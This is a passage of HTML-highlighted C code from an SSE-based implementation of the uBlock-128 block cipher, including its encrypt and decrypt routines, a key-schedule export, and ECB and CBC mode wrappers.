class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)plain);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; round; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(round == <span class=\"number\">16</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[round]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[round] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)cipher, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Decrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">int</span> round)</span><span class=\"comment\">// uBlock解密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)cipher);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = round; i &gt; <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S_Inv, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S_Inv, state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)Subkey[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)plain, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_Round</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> cryptround)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, cryptround);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Key_Schedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *seedkey, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> direction, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *subkey)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"type\">int</span> i, j;</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"built_in\">uBlock_128_KeySchedule</span>(seedkey);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">0</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">1</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tiv[j] ^= input[g * <span class=\"number\">16</span> + j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toutput[g * <span class=\"number\">16</span> + j] ^= iv[j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, input+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Encrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Decrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> 